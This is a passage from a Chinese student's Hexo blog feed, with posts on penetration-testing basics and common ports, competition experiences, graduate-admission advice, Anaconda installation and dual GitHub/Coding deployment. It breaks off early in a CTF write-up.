    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>保完研把之前学的东西总结一遍，正好最近在上工程实训的课，借着复习一遍了，仅作为我的学习记录，没有高超的技术分享。</p><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>渗透测试就是利用学习掌握的技能通过一种模拟攻击的技术与方法，挫败目标系统的安全控制策略并获得控制访问权的安全测试方法，对网站进行渗透，发现其中的漏洞风险，并撰写报告告知客户，客户依据我们攥写的报告对漏洞和风险进行修补，防止攻击。</p><p>渗透测试的主要依据是CVE（Common Vulnerabilities and Exposures通用漏洞披露，会为漏洞命个名称，帮助用户共享数据）已经发现的安全漏洞，进行<strong>模拟黑客或入侵者的攻击</strong>，对网站应用、服务器系统和其他网络设备进行非破坏性质的攻击性测试</p><h3 id="常见端口及漏洞"><a href="#常见端口及漏洞" class="headerlink" title="常见端口及漏洞"></a>常见端口及漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 常利用的端口">21 —— FTP，查看是否存在匿名访问；<br>22 —— SSH，查看是否存在弱口令；<br>80 —— HTTP，常见web漏洞；<br>443 —— openssl，心脏出血；<br>445 —— smb、ms08‐067、ms17‐010；<br>1433 —— mssql，弱口令；<br>1521 —— oracle，弱口令；<br>3389 —— win远程桌面，弱口令；<br>6379 —— redis未授权访问，弱口令；<br>8080 —— tomcat漏洞<br></code></pre></td></tr></table></figure><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p><img src="/img/%E6%B8%97%E9%80%8F1.1.png" alt="图片" title="渗透测试的基本流程"></p><h3 id="专业术语"><a href="#专业术语" class="headerlink" title="专业术语"></a>专业术语</h3><p>漏洞：硬件、软件、协议等等的可利用<strong>安全缺陷</strong>，可能被攻击者利用，对数据进行篡改，控制等</p><p>CVE： CVE 的英⽂全称是“Common Vulnerabilities &amp; Exposures”<strong>公共漏洞披露</strong>。CVE为⼴泛认同的信息安全漏洞或者已经暴露出来的弱点给出㇐个统一的漏洞编号标准</p><p>PoC：全称“Proof of Concept”，中文“观点证明”，用于证明某种技术、漏洞或安全问题的存在。常指一段<strong>漏洞证明的代码</strong>，使得读者能够确认这个漏洞是真实存在的。<br>假设某个网站存在一个SQL注入漏洞，允许攻击者通过恶意输入执行数据库查询。一个POC可能是一段代码，可以在该网站的搜索框中注入恶意SQL语句，并获取敏感数据。这个POC可以证明该漏洞的存在，并帮助网站的管理员意识到需要修复这个问题。</p><p>Exp：全称“Exploit”，中文“漏洞利用”，指<strong>利用系统漏洞进行攻击的活动</strong>。EXP通常是用于利用已知漏洞的程序或脚本，以获取对目标系统的未授权访问、控制或执行特定操作的能力。PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。</p><p>Payload：中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。Payload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 Exp，也就是说不存在通用的 Exp。</p><p>小例子：<br>假如你是一名侦探，此时你正在监视某人，有一天你发现他家的窗户没关好，这可能是一个漏洞，你去推了推，发现推开了，那这就是一个Poc，你验证了这个漏洞的存在。第二天你你推窗进去了，查看了机密文件，并安装了窃听器，那这一套动作做的就是一个Exp，在他家所做的事情就是不同的Payload，窃听器就是一个Payload。</p><p>总结：<br>“Poc”相当于侦探发现并验证了窗户未关好的漏洞。<br>“Exp”相当于侦探利用这个漏洞进入房间，并且查看了文件，安装了窃听器。<br>“Payload”可以指侦探在房间里进行的各种行动，比如查看文件或安装窃听器。</p><p>还有其他一些通俗易懂的名词，比如shell、提权、后门、木马等等不过多赘述。</p><h3 id="价值作用"><a href="#价值作用" class="headerlink" title="价值作用"></a>价值作用</h3><p>渗透测试是我接触网安以来感觉最像黑客的事情，能获得系统的权限，更改系统的内容，进行信息的获取和修改，狠狠满足了黑客梦，对于就业来说也有相关的岗位，不过安全没有小厂，全都是大厂，这也就意味着门槛高薪资高。</p><p>学得好可以去hvv做红方，23年我朋友去的时候<strong>一天1500</strong>，自从<a href="https://www.bilibili.com/video/BV1Mu411E7AW/?spm_id_from=333.337.search-card.all.click&vd_source=9292f2260ddccfeb23b7d147e383d780">苕皮哥事件</a>后，今年我问了问只有几百了，大不如前但相比别的事情还是很多。</p><p><strong>有时候别太大胆了什么都测一下，不要被警察叔叔约谈了</strong></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>竞赛记录汇总</title>
    <link href="/2024/08/19/%E7%AB%9E%E8%B5%9B%E8%AE%B0%E5%BD%95%E6%B1%87%E6%80%BB/"/>
    <url>/2024/08/19/%E7%AB%9E%E8%B5%9B%E8%AE%B0%E5%BD%95%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="数学类"><a href="#数学类" class="headerlink" title="数学类"></a>数学类</h2><h3 id="数学竞赛"><a href="#数学竞赛" class="headerlink" title="数学竞赛"></a>数学竞赛</h3><p>我是参加了2021年的<strong>全国大学生数学竞赛</strong>，那时候刚入学两个月，高数没怎么学拿了个二等奖。</p><p>据拿国一朋友的经验，打这个就和高中的数学竞赛一样，需要<strong>多刷题</strong>，但是这个对于保研来说也只是证明你的数学能力不如和老师专业对口的项目，拿国奖需要付出的时间比较多，总体来说<strong>性价比不高</strong>。</p><h3 id="数学建模"><a href="#数学建模" class="headerlink" title="数学建模"></a>数学建模</h3><h4 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h4><p>我参加的是2023年的<strong>全国大学生数学建模竞赛</strong>，舍友叫我一起参加，最终拿了国家二等奖。<br>我是负责<strong>代码</strong>部分的工作，总体上来说这个比赛<strong>性价比较高</strong>，能体现自己的能力但是老师不会在面试的时候针对性地问，不需要和数学竞赛一样进行大量的积累。<br>第一次的数学建模比赛是之前MathorCup杯拿了个国三，然后第二次就参加数模国赛了，有一两次的经历就能很快上手，主要还是看个人能力，备战这个的意义不大，熟悉python和matlab就好。</p><p>关于数学建模最重要的还是<strong>选题</strong>，对于本科生来说要在ABC三个里面选一个题，当时我们是选的A题，因为队伍中有人物理比较强。物理强的同学负责受力分析、建模，把建模后需要运算实现的东西由我来用代码实现，再给写论文的同学进行编写。</p><p>选题的时候主要看队伍的配置和可以找到的<strong>参考论文</strong>，队伍配置不用多说，很多人直接就会把A题给跳了因为队伍里面都不会物理，可以找到的参考论文对整个竞赛的过程帮助极大。<br>最好是去web of science或者谷歌学术上看看有没有选题相关的问题，再不济就去知网。当时我们的题目是定日镜场的排布，看论文知道一种规划叫campo排布，看了之后感觉很合理就用代码实现了，效果挺好的。</p><p>数学建模的整个过程就很像一场<strong>小的科研过程</strong>，从选题到找文献到建模实现到编写论文，当时三天几乎就睡了不到十个小时，最后拿奖了也是收获感满满没有白费三天熬夜。<br>拿到了国奖是要答辩的，<strong>答辩不好就是省奖</strong>，当时身边有两个队伍含泪省奖了，当时出了个小插曲，比赛结束了之后我报复性地把matlab删了，因为看到这东西就头疼。答辩前一天又被迫下回来了。</p><p>对于数学建模国赛的话网络上会有很多的资料和辅助代码，如果是想拿国奖的话<strong>建议不要借鉴</strong>。当时就有身边的同学借鉴网络上的资料，在各种公众号、闲鱼和qq微信群里。这种东西全国各地的同学都能看到，如果都用这个的话肯定都是一样的分数，想要做得好还得是自己要有东西，熟悉了基本工具的使用之后就看自己对数学的理解程度了，包括数据的处理方式，怎么优化算法等等。</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>数学建模先选好题，主要还是看<strong>队伍的配置</strong>量力而行，不要硬着头皮上：</p><p>A： 上限高下限低、容易拿大奖，但是<strong>难度大很容易做不完</strong>，做A的也是最少的<br>B： 介于AC之间<br>C： 很多新手第一次都选C，难度最低最多人做、<strong>最难拿大奖</strong>因为卷的人太多了</p><p>基本逻辑就是每个题目<strong>按照比例</strong>给奖，卷的人多就难拿，卷的人少就好拿。</p><p>接下来就看着每个小问一题一题地做，期间最好是能知道这个领域的sota进行一些借鉴，学习最开始的过程就是模仿。在写代码的时候注意<strong>不要硬编码</strong>当时本人水平有限全是硬编码导致队友很难上手我的代码。</p><p>到了最后两天的论文编写的时候都帮着点写论文的同学，现在<strong>AIGC</strong>很发达，可以多利用进行美化。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>队伍配置是最最最重要的，一定一定要<strong>找好队友</strong>，至少不要半路跑路。<br>要有个好的队长推进度，进行整个流程的<strong>各个步骤的时间管理</strong>，其次就是代码手要能实现建模的内容，由于AIGC现在特别强大，对于论文手的要求也变得更弱了。</p><h2 id="算法类"><a href="#算法类" class="headerlink" title="算法类"></a>算法类</h2><p><strong>语言一定选C++</strong><br><strong>语言一定选C++</strong><br><strong>语言一定选C++</strong></p><p>算法强是真的有用，我认识一个学长是金牌爷夏令营机试ak直接上岸上交学硕了</p><h3 id="CCF-CSP认证"><a href="#CCF-CSP认证" class="headerlink" title="CCF-CSP认证"></a>CCF-CSP认证</h3><p>这个比赛可以说是从大一打到大三，历经三年，最后是440分，终于是和CSP分手了：<br><img src="/img/csp1.png" alt="图片" title="三年来的CSP成绩记录"></p><h4 id="第一阶段（0-200）"><a href="#第一阶段（0-200）" class="headerlink" title="第一阶段（0-200）"></a>第一阶段（0-200）</h4><p>首先大一的时候参加这个比赛几乎就只能做第一题，第一次考的时候第一题费尽心思模拟完结果爆了个<strong>Runtime Error</strong>，印象特别深。当时用的是C，具体是什么问题没搞清楚，感觉自己模拟完了应该能过，结果没过，心态大崩。当时第一题做了一个多小时，还记得那个下午做的特别痛苦。<br>解决方法就是刷题，不用去看什么算法视频，直接<strong>把往年的前两题全都刷完</strong>就能提升，主要还是模拟能力太强了，如果一二题都刷完了的话能达到100+的水平，有时候可能第二题不能优化过。<br>当时的我就把题目都刷了一遍，基本能达到200分：<br><img src="/img/csp2.png" alt="图片" title="狠狠刷了波往年的前两题"></p><h4 id="第二阶段（200-）"><a href="#第二阶段（200-）" class="headerlink" title="第二阶段（200+）"></a>第二阶段（200+）</h4><p>这个阶段的话就需要知道一些具体的算法了，比如最经典的前缀和、树状数组、二分等等，建议<strong>去Acwing上看算法基础课</strong>，基本看完算法基础课就能稳定200+了，前两题能ac后面的45也能骗点分，由于本人偏好不做第三题大模拟一般一二速通之后就去后面两题骗分了，我也可以借我的Acwing账号，我之后估计也用不到了。<br><img src="/img/csp3.png" alt="图片" title="第二阶段的我"></p><h4 id="第三阶段（300-）"><a href="#第三阶段（300-）" class="headerlink" title="第三阶段（300+）"></a>第三阶段（300+）</h4><p>一般csp300分的话就是个分水岭了，达到300分一般分为两种：</p><p>A. 练第三题，123ac拿300分<br>B. 练动规贪心和图论等等优化，争取45多拿点，加上12题的200分</p><p>我是B路线，天生反感大模拟。这里的话建议把Acwing算法基础课的<strong>后两章</strong>都认真做一遍，掌握基础的知识点之后把之前的题目刷一刷，后两题大部分都是动态规划、贪心算法和图论。本来我的计划也是后两题拿个大部分的分凑够300去RUC或者北航抵掉机试的，结果意外后两题ac了，特别是最后一题的矩阵覆盖，感觉数据比较弱，熟练掌握二维前缀和以及线段覆盖应该就能做出来，十多行代码而已。<br><img src="/img/csp4.png" alt="图片" title="还是不会做第三题。。。"></p><h3 id="蓝桥杯"><a href="#蓝桥杯" class="headerlink" title="蓝桥杯"></a>蓝桥杯</h3><p>最大的感受就是去了就有省三。。。<br>有<strong>填空题、数学题、编程题</strong>，前面的填空题吃一点数学基础甚至有点像脑筋急转弯，后面就是正常的模拟和算法了。</p><h2 id="CTF类"><a href="#CTF类" class="headerlink" title="CTF类"></a>CTF类</h2><p>CTF比赛是<strong>性价比最低</strong>的，投入大量时间但是难以拿奖，甚至很多CTF师傅学了几年CTF到头来拿到最高的奖项是PYCC。但是CTF比较酷，能体验到什么是<strong>真正的黑客</strong>，这也是我分流时选网安的原因，更多的CTF师傅是一种热爱，真要说出路找工作远不如ACM和AI。</p><p>我的CTF之路是从B站刷到<strong>ctfshow</strong>的视频开始的，看了B站的视频觉得挺厉害的就买了大师傅h1xa的课，天呐他真的太强了，跟着学完了WEB感觉收获很大，由于自己脑洞比较大所以对MISC也挺感兴趣的，在打比赛的WEB做不出来的时候就去看看MISC，后来和学长做了代码混淆的项目，对二进制方向有些了解，后来朋友带着我入门了漏洞挖掘。</p><p>之前20年前网安很吃香懂个kali就能进大厂，现在已经过了风头随之而来带来的收益也在减少，去年的苕皮事件直接把hvv狠狠砍了一波，今年一天初级最高就500，去年都1500了。</p><p>对于CTF转科研的话主要是以下几个方向：</p><p>对于<strong>PWN</strong>和<strong>RE</strong>方向的师傅之后科研科研走移动安全的漏洞挖掘（fdu有做这个）、摘要生成、函数名恢复等工作（ustc有做这个），现在利用大模型辅助这方面的安全工作是科研的热点。<br>对于<strong>WEB</strong>方向的师傅可以走WEB端的漏洞挖掘，比如PHP中的漏洞链挖掘（zju有做这个），WEB端的挖掘可以衍生在很多的场景下，比如JS引擎（tju有做这个）、数据库漏洞的挖掘（thu有做这个）。<br>对于<strong>MISC</strong>方向的可以做图像相关的工作，这就涉及到CV做的人太多了，做<strong>密码</strong>的也可以对口地找到做密码的老师（thu）。<br>总的来说，CTF转科研是有很多路可以走的，本人就是前两年学比赛，后一年搞科研。</p><h2 id="项目类"><a href="#项目类" class="headerlink" title="项目类"></a>项目类</h2><p>项目类的比赛是<strong>最有用的</strong>，老师在面试的时候会着重问这方面的内容，如果做的项目有质量而且和老师方向匹配的话那么大概率能够被老师看上。</p><p>对于大多数的人来说能够参加的就是互联网+、大创等等项目类的比赛，这种一般都是远古祖传项目，从上面流下来每一届都负责改一改文案，实际的内容基本不怎么动。这种东西<strong>不是自己做的没什么用</strong>。</p><p>在大一的时候算综测我看好多人都有互联网+、大创什么的，当时觉得可牛逼了，后来才知道有多没用，那种拥有很多个项目的人基本都是社交好相互之间挂名，真论自己的东西实际上什么都没有，面试的时候也千万别拿着祖传项目往简历上写，一问代码你就老实了。</p><p>真正有用的是自己去做的项目从而参加各种作品赛比如有C4、CISCN等等</p><p>具体做项目的过程：</p><ol><li>没有基础的话先去顶会找别人的论文进行解读复现，随后自己进行改进包装。</li><li>有基础的就把自己的idea实现与领域的sota进行对比，有点类似发了篇中文论文。</li></ol><p>其中就涉及到数据集的收集对比、数据的处理、模型的改进、性能的对比等等环节这些就需要自己进行积累学习。</p><h3 id="CISCN作品赛"><a href="#CISCN作品赛" class="headerlink" title="CISCN作品赛"></a>CISCN作品赛</h3><p>水比赛不记录了之前一堆的互联网+和大创也就外行看着感觉厉害一点，记录一下今年刚拿的CISCN国奖，这个含金量应该是所有作品赛里面最高的了。</p><p>这是今年作品赛的时间安排:<br><img src="/img/ciscn1.png" alt="图片" title="时间安排"><br>6.5之前提交作品即可，静待一个月后会公布决赛名单，当时实践赛名单先出我以为是作品赛看到没进国赛直接把官方队长群退了，后来发现是看错了。</p><p>今年的是在西工大，本以为能去西安玩一趟，结果在太仓校区举办，顺道游了一圈苏州园林（看我pyq</p><p>做了个后门攻击的项目，由于比赛不接受攻击课题，强行包装成了后门的漏洞挖掘，也是挺牵强的，因为我们并没有提出防御的措施，仅仅对不同的恶意软件检测模型进行了攻击。</p><p>CISCN决赛的获奖率是100%，再不济都有个优胜奖（相当于没有），我们想的是冲冲国二，因为做的确实挺好的了，无论是演示视频还是文档的编写，我的队友都反复琢磨了几遍。</p><p>甚至最后决赛线下答辩的时候都和老师有说有笑的，老师还在结束的时候说挺好的，结果就给了个三等奖😵。这个比赛如果拿了国一国二是会在当天晚上收到官方的短信的，要求第二天早些到会场进行彩排，如果是三等和优胜奖的话就不会进行信息通知，当晚我们没收到通知特别慌，感觉要寄了，最后幸好是拿到了三等奖（不拿奖都不好意思报销</p><p>我感觉这个比赛虽然难度大含金量高但是还不够公开透明，应该把每个组的分数给公开，不然难免让人怀疑存在人情世故。</p><p>看到了有把github上的区块链项目直接搬来参加的甚至还进了决赛，正好我做过这个项目用fabric，他的前端甚至都和我一样🤣，另外有两个组的前端几乎相同只是换了个颜色，组委会还把两个组的海报放在一起，真的太好笑了。<br><img src="/img/ciscn2.jpg" alt="图片" title="近乎一样的前端，就地球换了个色🌏"></p>]]></content>
    
    
    <categories>
      
      <category>保研</category>
      
      <category>相关竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>数学竞赛</tag>
      
      <tag>数学建模</tag>
      
      <tag>CCF-CSP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研之路</title>
    <link href="/2024/08/07/%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/"/>
    <url>/2024/08/07/%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>特别感谢在保研路上帮助我的朋友、同学和老师，特别感谢周帅宇学长。</p><h3 id="一、个人背景"><a href="#一、个人背景" class="headerlink" title="一、个人背景"></a>一、个人背景</h3><p>学校：终极末流211 ynu（个人感觉超级末</p><p>rank：综测（2&#x2F;100+） 绩点（3&#x2F;100+） 皆为前两年排名<br>因为本人夏令营上岸没有参加预推免，最后一年综测也没加活动分算是给后面同学一些出路了</p><p>英语：四级 474， 六级 439（8.23才出，夏令营没用到）<br>英语烂，被老师质问过，雅思氪金考了一波用来夏令营报名还是发挥了一定的作用</p><p>获奖：奖项较多，可以去看单独的帖子已经都汇总好了，数学&#x2F;算法&#x2F;CTF&#x2F;项目类都有</p><p>科研：和本校老师有三段科研经历，大部分联系的老师都对科研经历感兴趣<br>（特别感谢zyc老师以及wjt、laq在大三科研的时候帮了我特别多）</p><p>offer：北大rw、中科大zwm组、上交apex组、浙大小导</p><p>最终去向：</p><h3 id="二、保研意向"><a href="#二、保研意向" class="headerlink" title="二、保研意向"></a>二、保研意向</h3><p>报名类型：学硕（如果是thu的话那什么都可以，网安人的终极梦想网研院）</p><p>意向课题组：尽量选择大组、科研氛围浓厚、老师学术水平强、有大老板（希望有个大老板可以在之后无论就业还是教职上帮一把）</p><p>科研方向：一定要与安全相关，可以是AI安全或者传统安全，不太能接受纯别的方向 </p><p>重要程度：导师&gt;&gt;title&gt;地域。因为本科学校实行导师制，每个学生都有自己的导师，在这期间我很能感受到导师对于学生的重要性，地域因素基本不考虑，没有固定想要发展的城市之后也有出国的打算</p><p>总的来说保研的最终目的就是为了选择个去处能获得更多的资源，其中包括学校的title、组内的资源、老板的地位等等因素需要考虑。</p><h3 id="三、个人想法"><a href="#三、个人想法" class="headerlink" title="三、个人想法"></a>三、个人想法</h3><p>首先要知道学校的排名，借鉴一下<a href="https://www.zhihu.com/question/19825429/answer/2680933336">知乎</a>：<br>……………………………………………………………………………………………………………………………………………………………………………………………<br>T1:清华叉院、清华计算机、北大计算机、北大智能</p><p>T2:清华软院、清华深圳、北大深圳、北大软微、浙大计算机、上交计算机、南大人工智能、中科大计算机、南大计算机、人大高瓴、复旦计算机、中科院两所</p><p>T3:北航计算机、哈工深计算机、中科院软件所、人大计算机、浙大软院、南大软院、中科大软院、复旦软院、中科大先研院、国科大深先院</p><p>T4:浙大工院、复旦工研院、中科大科学岛、北航软院、华科、同济、哈工本部</p><p>T5:中科院信工所、国科大杭高院、成电、北邮、北理、武大、西交、东南、南开、中大、天大、华师、厦大、华工、西工、哈工威、南科、上科</p><p>T6:西电、中南、大工、川大、山大、吉大、重大、东北、湖大、北交</p><p>T7:中农、兰大、中海洋、南航、南理、北科、北工、华理、上大、苏大、河海、武理、哈工程、合工、西南交、暨大、深大</p><p>PS：很多学校的网安都是包含在计算机里的，比如清华网研院&#x3D;cs、上交电院（计算机）包括网安、浙大网安隶属于计算机学院等等。<br>……………………………………………………………………………………………………………………………………………………………………………………………</p><p>对自己要有个清晰了定位，我可以接受T3的强组orT2弱组（但不能坑），T1太难了带着ynu的title我实在是不敢想</p><p>首先我有个原则就是<strong>套不到导师就不报这个学校</strong>，导师好不好真的太重要了😀，我必须要确保我导师人品好才敢去读</p><p>所以本人的路线：先拿T4保底，再去套磁T3\T2的老师，很幸运，五月份就套上了华科面试聊的都挺顺利算是拿到了华科的保底。</p><p>初期的我是纯title战士，特别想去tpu，在看了tpu官网的<strong>所有</strong>的做计算机的老师之后，本人甚至去投了清深的xx组，现在看来特别荒唐，清北深做安全的都是神兽能救一个是一个。<br>后来知道其实只看title的话意义不大，正如zsy所说，</p><p>到了后来有老师给我推荐学校对我帮助很大，在经历了艰难地选择offer之后最后选择了ustc的强组，如果想要了解清北华五的计算机可以问我基本每个学校的老师都套磁过。</p><p>本人五月份的时候首先选择了套个中九进行保底（HUST），我套的是梧桐雨信息安全研究小组，有对应的公众号感兴趣的同学可以进行查看，算是比较顺利，和博士生学长面试了甚至还让了另外的学长来帮我填报学校的夏令营，态度非常好。</p><p>在有了华科保底之后我就往上走了，开始套清北华五，大多数的老师都会选择漠视不过由于本人发的比较多几乎每个学校都有老师回了我，后来找老师推荐入营了加上和套磁的老师联系下来感觉老师人不错就选择了USTC。</p><h3 id="四、夏令营投递"><a href="#四、夏令营投递" class="headerlink" title="四、夏令营投递"></a>四、夏令营投递</h3><p>投了非常非常多，由于本人的眼高手低导致初期没有任何收获：<br><img src="/img/%E4%BF%9D%E7%A0%941.png" alt="图片" title="部分夏令营投递"><br>这破学校出身实在是太烂了，加上是rk2，几乎与顶尖的院系都无缘。</p><h3 id="五、各个阶段"><a href="#五、各个阶段" class="headerlink" title="五、各个阶段"></a>五、各个阶段</h3><h4 id="焦虑迷茫期"><a href="#焦虑迷茫期" class="headerlink" title="焦虑迷茫期"></a>焦虑迷茫期</h4><p>一开始只有个华科的offer，没有达到自己的预期，特别的焦虑，把当时所有的夏令营都报完了，结果基本没有什么收获，很多老师跟我聊好了后跟我说，云南大学可能入营有点难。。。</p><p>由于本人的超级e人属性，套磁了非常非常多的老师，基本每个学校都有回应，这里细说一下套过的一些顶级酒吧舞的一些情况</p><h5 id="华科"><a href="#华科" class="headerlink" title="华科"></a>华科</h5><p>zsy跟我说起了华科电信学院有个做安全的组让我套套估计很容易进，结果真一套一个准，华科有独立的网安学院和武大网安一起建设叫做ncc，所有电信院的这个组基本就没什么人报，和老师套磁后直接就加微信面试了非常的顺利</p><h5 id="南大"><a href="#南大" class="headerlink" title="南大"></a>南大</h5><h5 id="人大"><a href="#人大" class="headerlink" title="人大"></a>人大</h5><h5 id="北大"><a href="#北大" class="headerlink" title="北大"></a>北大</h5><h5 id="清深"><a href="#清深" class="headerlink" title="清深"></a>清深</h5><h5 id="上交"><a href="#上交" class="headerlink" title="上交"></a>上交</h5><h5 id="浙大"><a href="#浙大" class="headerlink" title="浙大"></a>浙大</h5><h4 id="重大转折期"><a href="#重大转折期" class="headerlink" title="重大转折期"></a>重大转折期</h4><h4 id="选择困难期"><a href="#选择困难期" class="headerlink" title="选择困难期"></a>选择困难期</h4><p>还没写完~</p>]]></content>
    
    
    <categories>
      
      <category>保研</category>
      
      <category>心路历程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>新Anaconda安装快捷方式</title>
    <link href="/2024/08/07/%E6%96%B0Anaconda%E5%AE%89%E8%A3%85%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"/>
    <url>/2024/08/07/%E6%96%B0Anaconda%E5%AE%89%E8%A3%85%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><a href="https://www.anaconda.com/download/success">Anaconda下载地址</a> </p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>近期需要参加CISCN的作品赛国赛，台式放宿舍了，笔记本上重新配了一遍环境，在我下载<a href="https://www.anaconda.com/">Anaconda</a>的时候发现他已经偷偷更新了，不能直接地进行下载，需要点来点去的 。<br><img src="/img/Anaconda1.png" alt="图片" title="点击Free Download"><br>在这里的话就需要填写个邮箱去获取Anaconda给你发的“相关资讯、产品、服务”，说白了就是官方需要你<strong>提供个邮箱接受垃圾邮件</strong>,非常恶心，只有点了下面的框中的同意才能给你下载地址。<br><img src="/img/Anaconda2.png" alt="图片" title="填写邮箱获取下载链接"><br>输入完成了之后就会进入到上面提到的下载地址中。<br><img src="/img/Anaconda3.png" alt="图片" title="毫无意义地跳转到下载"><br>下载之后在安装过程中需要特别注意勾选Install for <strong>Just Me</strong>,不能选ALL Users。选了ALL Users的话创建虚拟环境的时候不会在安装Anaconda的目录env文件下创建，而会在C盘中创建 <strong>.conda</strong>的文件然后在里面安装创建的虚拟环境。<br><img src="/img/Anaconda4.png" alt="图片" title="全点Next即可"><br>创建好虚拟环境后，使用 <code>conda env list</code> 查看环境。<br><img src="/img/Anaconda5.png" alt="图片" title="创建虚拟环境后正确的结果"></p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Anaconda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Coding+Github双线部署Hexo</title>
    <link href="/2024/08/07/Coding-Github%E5%8F%8C%E7%BA%BF%E9%83%A8%E7%BD%B2Hexo/"/>
    <url>/2024/08/07/Coding-Github%E5%8F%8C%E7%BA%BF%E9%83%A8%E7%BD%B2Hexo/</url>
    
    <content type="html"><![CDATA[<h2 id="Github部署博客"><a href="#Github部署博客" class="headerlink" title="Github部署博客"></a>Github部署博客</h2><p>用GitHub page可以<strong>免费</strong>静态部署博客，非常良心，不过想要流畅查看博客的话需要翻墙。<br>大致流程就是有安装好git，配好ssh的公钥和私钥，创建好仓库和分支，之后就可以hexo d上传本地的资料到博客上，B站上有手把手教学不会的可以去对照着看，这方面的教程网络上太多了不过多赘述。<br>更多资料可以查看官方的文档: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h2 id="Coding部署博客"><a href="#Coding部署博客" class="headerlink" title="Coding部署博客"></a>Coding部署博客</h2><p>Coding作为腾讯出品的低配GitHub在我印象中也具有静态部署的功能，所以就打算双线部署加快一下在国内的访问速度。<br>在我配置的时候发现Coding在两年前关闭了免费的静态部署，需要在腾讯云中开启对象存储，查阅之前的官方文档看到可以静态部署博客：<br><img src="/img/coding1.png" alt="图片" title="支持免费静态部署"><br>现在在coding上只有基于主机的持续部署<br><img src="/img/coding2.png" alt="图片" title="主机部署"><br>后来发现官方已经关闭了这个业务，腾讯云不想我们白嫖<br><img src="/img/coding3.png" alt="图片" title="关闭网站托管"><br>现在需要购买存储桶了，这样也会比服务器便宜很多：<br><a href="https://coding.net/help/docs/ci/practice/cloud-storage.html">官方文档</a></p><h2 id="全局config配置"><a href="#全局config配置" class="headerlink" title="全局config配置"></a>全局config配置</h2><p>在网络上查阅了各种资料发现都不能使用hexo d的时候同时成功更新两个仓库，所以就自己看官方文档尝试了一下这种写法，发现是正确的！<br>要注意的是分支，之前的Github部署博客网络上的教程和现版本不同，之前的默认分支名称是”master”,现在将其更改为”main”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs config">deploy:<br>- type: git<br>  repo:<br>    github: https://github.com/lan041221/lan041221.github.io.git,main<br>    coding: git@e.coding.net:g-knec4969/l1nk/l1nk.git,master<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
      <tag>Github</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC一血记录</title>
    <link href="/2024/08/07/ISCC%E4%B8%80%E8%A1%80%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/08/07/ISCC%E4%B8%80%E8%A1%80%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于ISCC独有的<strong>传播范围广</strong>的特性，导致有很多题目突然间可能就有很多人顿悟从而导致ISCC被业内所诟病，这个比赛基本也很容易就能拿到国奖，其奖项的含金量也无从定义。但是拿一血的含金量是毋庸置疑的，毕竟是全国第一个做出来，这里记录一下拿一血的过程。</p><h3 id="题目：成语学习"><a href="#题目：成语学习" class="headerlink" title="题目：成语学习"></a>题目：成语学习</h3><p>根据流量分析压缩包得到密码为57pmYyWt，丢进虚拟机解，发现是个压缩包<br><img src="/img/ISCC%E4%B8%80%E8%A1%801.png" alt="图片" title="流量分析得到压缩包"></p><p>查看flag在哪，用下面的语句在当前目录及其子目录中搜索名为 flag.txt 的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find ./* -name flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/ISCC%E4%B8%80%E8%A1%802.png" alt="图片" title="找到flag.txt"><br>查看里面的内容，上面说不要用食物去加密，食物是英语，文档里面题目是《你信我啊》，这个题叫做《成语学习》。联想到<strong>加salt的哈希算法</strong>用食物（salt）去加密他给的成语<br><img 